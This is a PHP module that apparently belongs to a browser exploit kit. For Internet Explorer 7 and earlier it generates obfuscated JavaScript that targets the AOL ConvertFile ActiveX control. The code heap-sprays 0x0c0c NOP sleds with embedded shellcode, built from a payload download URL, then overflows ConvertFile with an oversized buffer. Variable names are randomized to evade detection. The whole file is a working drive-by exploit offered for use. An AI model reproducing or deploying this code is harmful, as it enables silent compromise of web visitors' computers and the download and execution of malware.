<?php 
$randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
$strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "AOL ConvertFile");
if( $browser == "ie" && $version <= 7 ) 
{
    $functionName = $ExploitFunctions[10];
    $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
    $eArray[] = "\r\nfunction " . $functionName . "(){\r\n  try {\r\n        var " . $randVar[1] . " = document.createElement('object');\r\n        " . $randVar[1] . ".classid = \"clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6\";\r\n        " . $randVar[1] . ".codebase = \"http://pdl.stream.aol.com/downloads/aol/unagi/ampx_en_dl.cab\";\r\n\t\tvar " . $randVar[13] . " = '" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "'.replace(/" . $replaceFunction . "/g,\"Au\".replace(/A/g,\"B\").replace(/B/g,unescape(\"%25\")));\r\n        " . $randVar[2] . " = unescape(" . $randVar[13] . ");\r\n        " . $randVar[5] . " = unescape(\"%u0c0c%u0c0c\");\r\n        " . $randVar[7] . " = 20;\r\n        " . $randVar[6] . " = " . $randVar[7] . " + " . $randVar[2] . ".length;\r\n        while (" . $randVar[5] . ".length < " . $randVar[6] . ") {\r\n            " . $randVar[5] . " += " . $randVar[5] . ";\r\n        }\r\n        fill" . $randVar[8] . " = " . $randVar[5] . ".substring(0, " . $randVar[6] . ");\r\n        " . $randVar[8] . " = " . $randVar[5] . ".substring(0, " . $randVar[5] . ".length - " . $randVar[6] . ");\r\n        while (" . $randVar[8] . ".length + " . $randVar[6] . " < 0x40000) {\r\n            " . $randVar[8] . " = " . $randVar[8] . " + " . $randVar[8] . " + fill" . $randVar[8] . ";\r\n        }\r\n        " . $randVar[4] . " = new Array();\r\n        for (i = 0; i < 666; i++) {\r\n            " . $randVar[4] . "[i] = " . $randVar[8] . " + " . $randVar[2] . ";\r\n        }\r\n        var " . $randVar[3] . ";\r\n        for (i = 0; i < 1400; i++) {\r\n            " . $randVar[3] . " = " . $randVar[3] . " + unescape(\"%ff\");\r\n        }\r\n        for (i = 0; i < 1000; i++) {\r\n            " . $randVar[3] . " = " . $randVar[3] . " + unescape(\"%0c\");\r\n        }\r\n        " . $randVar[1] . ".ConvertFile(" . $randVar[3] . ", 1, 1, 1, 1, 1);\r\n        " . $randVar[1] . ".ConvertFile(" . $randVar[3] . ", 1, 1, 1, 1, 1);\r\n        " . $randVar[1] . ".ConvertFile(" . $randVar[3] . ", 1, 1, 1, 1, 1);\r\n        " . $randVar[1] . ".ConvertFile(" . $randVar[3] . ", 1, 1, 1, 1, 1);\r\n    }catch (e) {}\r\n\t{next}\r\n}";
}

echo "\t\t\t";

